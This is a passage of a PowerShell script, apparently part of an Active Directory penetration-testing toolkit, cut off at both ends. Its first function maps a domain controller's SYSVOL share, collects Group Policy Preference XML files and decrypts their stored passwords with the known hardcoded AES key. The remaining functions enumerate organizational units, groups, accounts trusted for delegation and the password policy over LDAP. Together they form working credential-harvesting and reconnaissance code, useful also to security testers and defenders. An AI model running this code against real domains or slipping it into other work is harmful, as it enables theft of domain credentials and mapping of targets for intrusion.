        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController
    )

    Begin
    {

        Write-Verbose "Getting domain group policy preference passwords..."

        # Create PS Credential object
        if($Password){
            $secpass = ConvertTo-SecureString $Password -AsPlainText -Force
            $Credential = New-Object System.Management.Automation.PSCredential ($Username, $secpass)                
        }

        # Ensure that machine is domain joined and script is running as a domain account, or a credential has been provided
        if ( ( ((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq $False ) -or ( -not $Env:USERDNSDOMAIN ) -and (-not $Credential) ) {
            throw 'Machine is not a domain member or User is not a member of the domain.'
            return
        }

        # ----------------------------------------------------------------
        # Define helper function that decodes and decrypts password
        # ----------------------------------------------------------------
        function Get-DecryptedCpassword {
            [CmdletBinding()]
            Param (
                [string] $Cpassword 
            )

            try {
                #Append appropriate padding based on string length  
                $Mod = ($Cpassword.length % 4)
            
                switch ($Mod) {
                '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
                '2' {$Cpassword += ('=' * (4 - $Mod))}
                '3' {$Cpassword += ('=' * (4 - $Mod))}
                }

                $Base64Decoded = [Convert]::FromBase64String($Cpassword)
            
                #Create a new AES .NET Crypto Object
                $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
                [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                     0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
            
                #Set IV to all nulls to prevent dynamic generation of IV value
                $AesIV = New-Object Byte[]($AesObject.IV.Length) 
                $AesObject.IV = $AesIV
                $AesObject.Key = $AesKey
                $DecryptorObject = $AesObject.CreateDecryptor() 
                [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
            
                return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
            } 
        
            catch {Write-Error $Error[0]}
        }  
       
        # ----------------------------------------------------------------
        # Authenticate to DC, mount sysvol share, & dump xml file contents
        # ----------------------------------------------------------------
 
        # Set target DC
        if($DomainController){
            $TargetDC = "\\$DomainController"
        }else{
            $TargetDC = $env:LOGONSERVER
        }

        # Create randomish name for dynamic mount point 
        $set = "abcdefghijklmnopqrstuvwxyz".ToCharArray();
        $result += $set | Get-Random -Count 10
        $DriveName = [String]::Join("",$result)        
        $DrivePath = "$TargetDC\sysvol"

        # Map a temp drive to the DC sysvol share
        Write-Verbose "Creating temp drive $DriveName mapped to $DrivePath..."
        If ($Credential.UserName){
        
            # Mount the drive
            New-PSDrive -PSProvider FileSystem -Name $DriveName -Root $DrivePath -Credential $Credential| Out-Null                        
        }else{
            
            # Create a temp drive mapping
            New-PSDrive -PSProvider FileSystem -Name $DriveName -Root $DrivePath | Out-Null                   
        }        
    }

    Process
    {
        # Verify temp drive mounted
        $DriveCheck = Get-PSDrive | Where { $_.name -like "$DriveName"}
        if($DriveCheck) {
            #Write-Verbose "$Drivename created."
        }else{
            Write-Verbose "Failed to mount $DriveName to $DrivePath."
            return
        }

        # ----------------------------------------------------------------
        # Find, download, parse, decrypt, and display results
        # ----------------------------------------------------------------
        
        # Setup temp drive name
        $DriveLetter = $DriveName+":"

        # Create table to store gpp passwords 
        $TableGPPPasswords = New-Object System.Data.DataTable         
        $TableGPPPasswords.Columns.Add('NewName') | Out-Null
        $TableGPPPasswords.Columns.Add('Changed') | Out-Null
        $TableGPPPasswords.Columns.Add('UserName') | Out-Null        
        $TableGPPPasswords.Columns.Add('CPassword') | Out-Null
        $TableGPPPasswords.Columns.Add('Password') | Out-Null        
        $TableGPPPasswords.Columns.Add('File') | Out-Null 

        # Create table to store default group policy configuration file paths
        $TableDefaultGPFilePaths = New-Object system.data.datatable
        $TableDefaultGPFilePaths.Columns.Add('filename') | Out-Null
        $TableDefaultGPFilePaths.Columns.Add('filepath') | Out-Null  

        # Add default group policy configuration file paths to table
        $TableDefaultGPFilePaths.Rows.Add("Groups.xml","\Machine\Preferences\Groups\Groups.xml") | Out-Null
        $TableDefaultGPFilePaths.Rows.Add("Groups.xml","\User\Preferences\Groups\Groups.xml") | Out-Null
        $TableDefaultGPFilePaths.Rows.Add("Services.xml","\Machine\Preferences\Services\Services.xml") | Out-Null
        $TableDefaultGPFilePaths.Rows.Add("Services.xml","\User\Preferences\Services\Services.xml") | Out-Null
        $TableDefaultGPFilePaths.Rows.Add("Scheduledtasks.xml","\Machine\Preferences\Scheduledtasks\Scheduledtasks.xml") | Out-Null
        $TableDefaultGPFilePaths.Rows.Add("Scheduledtasks.xml","\User\Preferences\Scheduledtasks\Scheduledtasks.xml") | Out-Null
        $TableDefaultGPFilePaths.Rows.Add("DataSources.xml","\Machine\Preferences\DataSources\DataSources.xml") | Out-Null
        $TableDefaultGPFilePaths.Rows.Add("DataSources.xml","\User\Preferences\DataSources\DataSources.xml") | Out-Null
        $TableDefaultGPFilePaths.Rows.Add("Printers.xml","\Machine\Preferences\Printers\Printers.xml") | Out-Null
        $TableDefaultGPFilePaths.Rows.Add("Printers.xml","\User\Preferences\Printers\Printers.xml") | Out-Null
        $TableDefaultGPFilePaths.Rows.Add("Drives.xml","\Machine\Preferences\Drives\Drives.xml") | Out-Null
        $TableDefaultGPFilePaths.Rows.Add("Drives.xml","\User\Preferences\Drives\Drives.xml") | Out-Null 
        
        # Create table to store verified files
        $TableGPFilePaths = New-Object system.data.datatable
        $TableGPFilePaths.Columns.Add('filename') | Out-Null
        $TableGPFilePaths.Columns.Add('filepath') | Out-Null
        $TableGPFilePaths.Clear()       

        # Determine policies folder path
        $GpoDomain = Get-ChildItem $DrivePath | Select-Object name -First 1 -ExpandProperty name
        $GpoPoliciesPath = "$DrivePath\$GpoDomain\Policies"

        # Iterate through each policy folder
        Get-ChildItem $GpoPoliciesPath | Select-Object fullname -ExpandProperty fullname |
        ForEach-Object {

            $GpPolicyPath = $_                   
            
            # Iterate through each potential gpp file path
            $TableDefaultGPFilePaths |
            ForEach-Object{

                # Create full path to gp configuraiton file
		        $GpFile = $_.filename
		        $GpPath = $_.filepath
		        $GpFullPath = "$GpPolicyPath$GpPath"
                
                # Check if file exists
                if(Test-Path $GpFullPath -ErrorAction SilentlyContinue)
                {
                    # Add files that exist to table
                    $TableGPFilePaths.Rows.Add($GpFile,$GpFullPath) | Out-Null                    
                }
            }            
        }

        # Check if files were
        $TableGPFilePathCount = $TableGPFilePaths.Rows.Count
        if ($TableGPFilePathCount -eq 0) {
            throw '0 group policy preference files were found.'
            return
        }else{
            Write-Verbose "$TableGPFilePathCount group policy preference files were found."
        }       

        # Iterate through each verified group policy file        
        $TableGPFilePaths | 
        ForEach-Object {
            [string]$FileName = $_.filename
            [string]$FilePath = $_.filepath

            # Get file content
            [xml]$FileContent = Get-Content -Path "$FilePath"

            # Parse Drives.xml
            if($FileName -like "Drives.xml"){   

                Write-Verbose "Parsing $FileName..."
                 
                $FileContent.Drives.Drive | 
                ForEach-Object {
                    [string]$Username = $_.properties.username
                    [string]$CPassword = $_.properties.cpassword
                    [string]$Password = Get-DecryptedCpassword $Cpassword
                    [string]$Changed = $_.changed
                    [string]$NewName = ""         
                    
                    # Add the results to the data table
                    $TableGPPPasswords.Rows.Add($NewName,$Changed,$Username,$Cpassword,$Password,$FilePath) | Out-Null      
                }                
            }  
            
            # Parse Groups.xml
            if($FileName -eq "Groups.xml"){   

                Write-Verbose "Parsing $FileName..."
                 
                $FileContent.Groups.User | 
                ForEach-Object {
                    [string]$Username = $_.properties.username
                    [string]$CPassword = $_.properties.cpassword
                    [string]$Password = Get-DecryptedCpassword $Cpassword
                    [string]$Changed = $Changed
                    [string]$NewName = $_.properties.newname        
                    
                    # Add the results to the data table
                    $TableGPPPasswords.Rows.Add($NewName,$Changed,$Username,$Cpassword,$Password,$FilePath) | Out-Null      
                }                
            } 
            
            # Parse Services.xml
            if($FileName -eq "Services.xml"){   

                Write-Verbose "Parsing $FileName..."
                 
                $FileContent.NTServices.NTService | 
                ForEach-Object {
                    [string]$Username = $_.properties.accountname
                    [string]$CPassword = $_.properties.cpassword
                    [string]$Password = Get-DecryptedCpassword $Cpassword
                    [datetime]$Changed = $_.changed
                    [string]$NewName = ""         
                    
                    # Add the results to the data table
                    $TableGPPPasswords.Rows.Add($NewName,$Changed,$Username,$Cpassword,$Password,$FilePath) | Out-Null      
                }                
            }
            
            # Parse ScheduledTasks.xml
            if($FileName -eq "ScheduledTasks.xml"){   

                Write-Verbose "Parsing $FileName..."
                 
                $FileContent.ScheduledTasks.Task | 
                ForEach-Object {
                    [string]$Username = $_.properties.runas
                    [string]$CPassword = $_.properties.cpassword
                    [string]$Password = Get-DecryptedCpassword $Cpassword
                    [datetime]$Changed = $_.changed
                    [string]$NewName = ""         
                    
                    # Add the results to the data table
                    $TableGPPPasswords.Rows.Add($NewName,$Changed,$Username,$Cpassword,$Password,$FilePath) | Out-Null      
                }                
            } 
            
            # Parse DataSources.xml
            if($FileName -eq "DataSources.xml"){   

                Write-Verbose "Parsing $FileName..."
                 
                $FileContent.DataSources.DataSource | 
                ForEach-Object {
                    [string]$Username = $_.properties.username
                    [string]$CPassword = $_.properties.cpassword
                    [string]$Password = Get-DecryptedCpassword $Cpassword
                    [datetime]$Changed = $_.changed
                    [string]$NewName = ""         
                    
                    # Add the results to the data table
                    $TableGPPPasswords.Rows.Add($NewName,$Changed,$Username,$Cpassword,$Password,$FilePath) | Out-Null      
                }                
            }
            
            # Parse Printers.xml
            if($FileName -eq "Printers.xml"){   

                Write-Verbose "Parsing $FileName..."
                 
                $FileContent.Printers.SharedPrinter | 
                ForEach-Object {
                    [string]$Username = $_.properties.username
                    [string]$CPassword = $_.properties.cpassword
                    [string]$Password = Get-DecryptedCpassword $Cpassword                    
                    [string]$Changed = [string]$_.changed
                    [string]$NewName = ""         
                    
                    # Add the results to the data table
                    $TableGPPPasswords.Rows.Add($NewName,$Changed,$Username,$Cpassword,$Password,$FilePath) | Out-Null      
                }                
            }
            
        }        
              
        # Remove the temp drive mapping
        Write-Verbose "Removing temp drive $DriveName..."
        Remove-PSDrive $DriveName
        
        # Display results
        $PasswordCount = $TableGPPPasswords | Sort-Object username -Unique | Select-Object username | Where-Object {$_.username -ne ""} | Measure-Object | Select-Object Count -ExpandProperty Count
        if($PasswordCount -ne 0)
        {
            Write-Verbose "$PasswordCount domain group policy preference passwords were found."
            Return $TableGPPPasswords
        }else{
            Write-Verbose "0 domain group policy preference passwords were found."
        }
    }

    END
    {
    }
}

# -------------------------------------------
# Function: Get-DomainOU
# -------------------------------------------
function Get-DomainOu
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,
        [Parameter(Mandatory=$false,

        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        ValueFromPipeline=$true,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Organizational unit to filter for.")]
        [string]$Ou = "*"
    )

    Begin
    {
        Write-Verbose "Getting domain OUs..."

        # Setup table for domain users
        $TableDomainOus = New-Object System.Data.DataTable
        $TableDomainOus.Columns.Add("ou") | Out-Null
        $TableDomainOus.Columns.Add("distinguishedname") | Out-Null
        $TableDomainOus.Columns.Add("adspath") | Out-Null
        $TableDomainOus.Columns.Add("objectclass") | Out-Null
        $TableDomainOus.Columns.Add("whencreated") | Out-Null
        $TableDomainOus.Columns.Add("whenchanged") | Out-Null
        $TableDomainOus.Columns.Add("instancetype") | Out-Null

    }

    Process
    {
        try
        {
            # Get objects
            $OuResults = Get-DomainObject -LdapFilter "(&(objectCategory=organizationalUnit)(ou=$ou))" -DomainController $DomainController -username $username -password $password -Credential $Credential

            # Parse results
            $OuResults | ForEach-Object {

                # Add results to table
                $TableDomainOus.Rows.Add( 
                    [string]$_.properties.ou,
                    [string]$_.properties.distinguishedname,
                    [string]$_.properties.adspath,
                    [string]$_.properties.objectclass,
                    [string]$_.properties.whencreated,
                    [string]$_.properties.whenchanged,
                    [string]$_.properties.instancetype
                ) | Out-Null         
             }
        }catch{
          "Error was $_"
          $line = $_.InvocationInfo.ScriptLineNumber
          "Error was in Line $line"
        }
    }

    End
    {
        # Check for domain ous
        if($TableDomainOus.Rows.Count -gt 0)
        {
            $TableDomainOusCount = $TableDomainOus.Rows.Count
            Write-Verbose "$TableDomainOusCount domain OUs found."
            Return $TableDomainOus
        }else{
            Write-Verbose "0 domain OUs were found."
        }
    }
}


# -------------------------------------------
# Function: Get-DomainObject
# -------------------------------------------
# Based on Get-ADObject function from:
# https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1
function Get-DomainObject
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        HelpMessage="LDAP Filter.")]
        [string]$LdapFilter = "",

        [Parameter(Mandatory=$false,
        HelpMessage="LDAP path.")]
        [string]$LdapPath,

        [Parameter(Mandatory=$false,
        HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
        [int]$Limit = 1000,

        [Parameter(Mandatory=$false,
        HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
        [ValidateSet("Subtree","OneLevel","Base")]
        [string]$SearchScope = "Subtree"
    )
    Begin
    {
        # Create PS Credential object
        if($Password){
            $secpass = ConvertTo-SecureString $Password -AsPlainText -Force
            $Credential = New-Object System.Management.Automation.PSCredential ($Username, $secpass)                
        }        

        # Create Create the connection to LDAP       
        if ($DomainController -and $Credential.GetNetworkCredential().Password)
        {
            $objDomain = (New-Object System.DirectoryServices.DirectoryEntry "LDAP://$DomainController", $Credential.UserName,$Credential.GetNetworkCredential().Password).distinguishedname
            
            # add ldap path
            if($LdapPath)
            {
                $LdapPath = "/"+$LdapPath+","+$objDomain
                $objDomainPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$DomainController$LdapPath", $Credential.UserName,$Credential.GetNetworkCredential().Password
            }else{
                $objDomainPath= New-Object System.DirectoryServices.DirectoryEntry "LDAP://$DomainController", $Credential.UserName,$Credential.GetNetworkCredential().Password
            }
            
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomainPath
        }else{
            $objDomain = ([ADSI]"").distinguishedName
            
            # add ldap path
            if($LdapPath)
            {
                $LdapPath = $LdapPath+","+$objDomain
                $objDomainPath  = [ADSI]"LDAP://$LdapPath"
            }else{
                $objDomainPath  = [ADSI]""
            }
              
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomainPath
        }

        # Setup LDAP filter
        $ObjSearcher.PageSize = $Limit
        $ObjSearcher.Filter = $LdapFilter
        $ObjSearcher.SearchScope = "Subtree"
    }

    Process
    {        
        try
        {
            # Return object
            $ObjSearcher.FindAll() | ForEach-Object {
              
                $_
            }
        }
        catch
        {
          "Error was $_"
          $line = $_.InvocationInfo.ScriptLineNumber
          "Error was in Line $line"
        }                
    }

    End
    {
    }
}


# -------------------------------------------
# Function: Get-DomainPolicies
# -------------------------------------------
Function Get-DomainPolicies{
    Write-Verbose "Getting domain GPOs..."
} 



# -------------------------------------------
# Function: Get-DomainGroup
# -------------------------------------------
function Get-DomainGroup
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        ValueFromPipeline=$true,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Group to filter for.")]
        [string]$Group = "*"
    )
    Begin
    {
        Write-Verbose "Getting domain groups..."

        # Setup table for domain group
        $TableDomainGroups = New-Object System.Data.DataTable            
        $TableDomainGroups.Columns.Add("Group") | Out-Null
        $TableDomainGroups.Columns.Add("Description") | Out-Null
        $TableDomainGroups.Columns.Add("Admincount") | Out-Null
        $TableDomainGroups.Columns.Add("Member") | Out-Null
        $TableDomainGroups.Clear()
    }

    Process
    {
        try
        {
            # Get results
            $GroupResults = Get-DomainObject -LdapFilter "(&(objectClass=group)(samaccountname=$Group))" -DomainController $DomainController -username $username -password $password -Credential $Credential

            # Parse results
            $GroupResults | ForEach-Object {

                # Add results to table
                $TableDomainGroups.Rows.Add( 
                [string]$_.properties.samaccountname,
                [string]$_.properties.description,
                [string]$_.properties.admincount,
                [string]$_.properties.member   
                ) | Out-Null                        
            }
        }
        catch
        {
          "Error was $_"
          $line = $_.InvocationInfo.ScriptLineNumber
          "Error was in Line $line"
        }                
    }

    End
    {
        # Check for results
        if($TableDomainGroups.Rows.Count -gt 0)
        {
            $TableDomainGroupsCount = $TableDomainGroups.Rows.Count
            Write-Verbose "$TableDomainGroupsCount domain groups found."
            Return $TableDomainGroups
        }else{
            Write-Verbose "0 domain groups were found."
        }
    }
}


# -------------------------------------------
# Function: Get-DomainUsersTrustedForDelegation
# -------------------------------------------
# Ref: http://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx
# Ref: https://technet.microsoft.com/en-us/library/cc739740(v=ws.10).aspx
# Ref: http://blog.backslasher.net/finding-accounts-trusted-for-delegation.html
function Get-DomainUsersTrustedForDelegation
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
        [int]$Limit = 1000,

        [Parameter(Mandatory=$false,
        HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
        [ValidateSet("Subtree","OneLevel","Base")]
        [string]$SearchScope = "Subtree",

        [Parameter(Mandatory=$false,
        HelpMessage="Distinguished Name Path to limit search to.")]

        [string]$SearchDN
    )
    Begin
    {
        Write-Verbose "Getting domain users that are trusted for delegation..."

        # Create PS Credential object
        if($Password)
        {
            Write-Verbose "Creating PsCredential object..."
            $secpass = ConvertTo-SecureString $Password -AsPlainText -Force
            $Credential = New-Object System.Management.Automation.PSCredential ($Username, $secpass)                
        }

        if ($DomainController -and $Credential.GetNetworkCredential().Password)
        {
            $objDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)", $Credential.UserName,$Credential.GetNetworkCredential().Password
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        }
        else
        {
            $objDomain = [ADSI]""  
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        }

        # Setup Data Table fo systems
        $TableTrustFordelegation = New-Object System.Data.DataTable         
        $TableTrustFordelegation.Columns.Add('samaccountname') | Out-Null
        $TableTrustFordelegation.Columns.Add('name') | Out-Null
        $TableTrustFordelegation.Columns.Add('description') | Out-Null
        $TableTrustFordelegation.Columns.Add('whencreated') | Out-Null
        $TableTrustFordelegation.Columns.Add('whenchanged') | Out-Null    
        $TableTrustFordelegation.Columns.Add('msDS-AllowedToDelegateTo') | Out-Null       
        $TableTrustFordelegation.Clear()
    }

    Process
    {
        $TrustedForDelegation = Get-DomainObject -LdapFilter "(&(samAccountType=805306368)(|(UserAccountControl:1.2.840.113556.1.4.803:=524288)(UserAccountControl:1.2.840.113556.1.4.803:=16777216)))" -DomainController $DomainController -username $username -password $password -Credential $Credential

        try
        {
          
            # Search for accounts
            $TrustedForDelegation | ForEach-Object {             

                 # Add account to table
                 $TableTrustFordelegation.Rows.Add(
                 [string]$_.properties.samaccountname,
                 [string]$_.properties.name,
                 [string]$_.properties.description,
                 [string]$_.properties.whencreated,
                 [string]$_.properties.whenchanged,
                 [string]$_.properties."msds-allowedtodelegateto"
                 ) | Out-Null
             }
        }
        catch
        {
          "Error was $_"
          $line = $_.InvocationInfo.ScriptLineNumber
          "Error was in Line $line"
        }
        
        

        # Check for accounts
        $TableTrustFordelegationCount = $TableTrustFordelegation.Rows.Count
        if($TableTrustFordelegationCount  -eq 0)
        {
            Write-Verbose "0 accounts were found that were trusted for delegation."
        }else{
            Write-Verbose "$TableTrustFordelegationCount accounts were found that were trusted for delegation."
            Return $TableTrustFordelegation
        }
    }

    End
    {

    }
}

# -------------------------------------------
# Function: Get-DomainUsersTrustedToAuthForDelegation
# -------------------------------------------
# Ref: http://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx
# Ref: https://technet.microsoft.com/en-us/library/cc739740(v=ws.10).aspx
# Ref: http://blog.backslasher.net/finding-accounts-trusted-for-delegation.html
function Get-DomainUsersTrustedToAuthForDelegation
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
        [int]$Limit = 1000,

        [Parameter(Mandatory=$false,
        HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
        [ValidateSet("Subtree","OneLevel","Base")]
        [string]$SearchScope = "Subtree",

        [Parameter(Mandatory=$false,
        HelpMessage="Distinguished Name Path to limit search to.")]

        [string]$SearchDN
    )
    Begin
    {

        Write-Verbose "Getting domain users that are trusted to authenticate for delegation..."

        # Create PS Credential object
        if($Password)
        {
            Write-Verbose "Creating PsCredential object..."
            $secpass = ConvertTo-SecureString $Password -AsPlainText -Force
            $Credential = New-Object System.Management.Automation.PSCredential ($Username, $secpass)                
        }

        if ($DomainController -and $Credential.GetNetworkCredential().Password)
        {
            $objDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)", $Credential.UserName,$Credential.GetNetworkCredential().Password
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        }
        else
        {
            $objDomain = [ADSI]""  
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        }

        # Setup Data Table fo systems
        $TableTrustFordelegation = New-Object System.Data.DataTable         
        $TableTrustFordelegation.Columns.Add('samaccountname') | Out-Null
        $TableTrustFordelegation.Columns.Add('name') | Out-Null
        $TableTrustFordelegation.Columns.Add('description') | Out-Null
        $TableTrustFordelegation.Columns.Add('whencreated') | Out-Null
        $TableTrustFordelegation.Columns.Add('whenchanged') | Out-Null    
        $TableTrustFordelegation.Columns.Add('msDS-AllowedToDelegateTo') | Out-Null       
        $TableTrustFordelegation.Clear()
    }

    Process
    {
        $TrustedForDelegation = Get-DomainObject -LdapFilter "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=16777216))" -DomainController $DomainController -username $username -password $password -Credential $Credential

        try
        {
          
            # Search for accounts
            $TrustedForDelegation | ForEach-Object {             

                 # Add account to table
                 $TableTrustFordelegation.Rows.Add(
                 [string]$_.properties.samaccountname,
                 [string]$_.properties.name,
                 [string]$_.properties.description,
                 [string]$_.properties.whencreated,
                 [string]$_.properties.whenchanged,
                 [string]$_.properties."msds-allowedtodelegateto"
                 ) | Out-Null
             }
        }
        catch
        {
          "Error was $_"
          $line = $_.InvocationInfo.ScriptLineNumber
          "Error was in Line $line"
        }
        
        

        # Check for accounts
        $TableTrustFordelegationCount = $TableTrustFordelegation.Rows.Count
        if($TableTrustFordelegationCount  -eq 0)
        {
            Write-Verbose "0 accounts were found that were Trusted To Auth For Delegation."
        }else{
            Write-Verbose "$TableTrustFordelegationCount accounts were found that were Trusted To Auth For Delegation."
            Return $TableTrustFordelegation
        }
    }

    End
    {

    }
}


# -------------------------------------------
# Function: Get-NetLogonFiles
# -------------------------------------------
Function Get-NetLogonFiles{
    Write-Verbose "Getting domain netlogon files..."
} 


# -------------------------------------------
# Function: Get-DomainAccountPolicy
# ------------------------------------------- 
# Reference: https://msdn.microsoft.com/en-us/library/ms682204(v=vs.85).aspx
function Get-DomainAccountPolicy
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController
    )

    Begin
    {
        Write-Verbose "Getting domain account policy..."

        # Create table for results
        $TableAccountPolicy = New-Object System.Data.DataTable 
        $TableAccountPolicy.Columns.Add("minlength") | Out-Null
        $TableAccountPolicy.Columns.Add("minpwdage") | Out-Null
        $TableAccountPolicy.Columns.Add("maxpwdage") | Out-Null
        $TableAccountPolicy.Columns.Add("pwdhistorylength") | Out-Null
        $TableAccountPolicy.Columns.Add("lockoutthreshhold") | Out-Null 
        $TableAccountPolicy.Columns.Add("lockoutduration") | Out-Null
        $TableAccountPolicy.Columns.Add("lockoutobservationwindow") | Out-Null
        $TableAccountPolicy.Columns.Add("pwdproperties") | Out-Null
        $TableAccountPolicy.Columns.Add("whenchanged") | Out-Null
        $TableAccountPolicy.Columns.Add("gplink") | Out-Null
        $TableAccountPolicy.Clear()
    }

    Process
    {
        try{

            # Get results
            $AccountPolicyResults = Get-DomainObject -LdapFilter "(objectClass=domainDNS)" -DomainController $DomainController -username $username -password $password -Credential $Credential

            # Parse results
            $AccountPolicyResults | ForEach-Object {

                # Add results to table
                $TableAccountPolicy.Rows.Add(
                [string]$_.properties.minpwdlength,
                [string][Math]::Floor([decimal](((([string]$_.properties.minpwdage -replace '-','') / (60 * 10000000)/60))/24)),
                [string][Math]::Floor([decimal](((([string]$_.properties.maxpwdage -replace '-','') / (60 * 10000000)/60))/24)),
                [string]$_.properties.pwdhistorylength,
                [string]$_.properties.lockoutthreshold,
                [string]([string]$_.properties.lockoutduration -replace '-','') / (60 * 10000000),
                [string]([string]$_.properties.lockoutobservationwindow -replace '-','') / (60 * 10000000),
                [string]$_.properties.pwdproperties,
                [string]$_.properties.whenchanged,
                [string]$_.properties.gplink 
                ) | Out-Null
            }
        }catch{
          "Error was $_"
          $line = $_.InvocationInfo.ScriptLineNumber
          "Error was in Line $line"
        } 
    }

    End
    {
        # Check for results
        if($TableAccountPolicy.Rows.Count -gt 0)
        {
            Write-Verbose "Successfully dumped the domain account policy."
            Return $TableAccountPolicy 
        }else{
            Write-Verbose "Unable to dump the domain account policy."
        }
    }
}

# -------------------------------------------
# Function: Get-FSMORoles
# ------------------------------------------- 
function Get-FSMORoles
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
        [int]$Limit = 1000,

        [Parameter(Mandatory=$false,
        HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
        [ValidateSet("Subtree","OneLevel","Base")]
        [string]$SearchScope = "Subtree",

        [Parameter(Mandatory=$false,
        HelpMessage="Distinguished Name Path to limit search to.")]
        [string]$SearchDN
    )

    Begin
    {
        Write-Verbose "Getting FSMO Roles..."
        # Create table for results
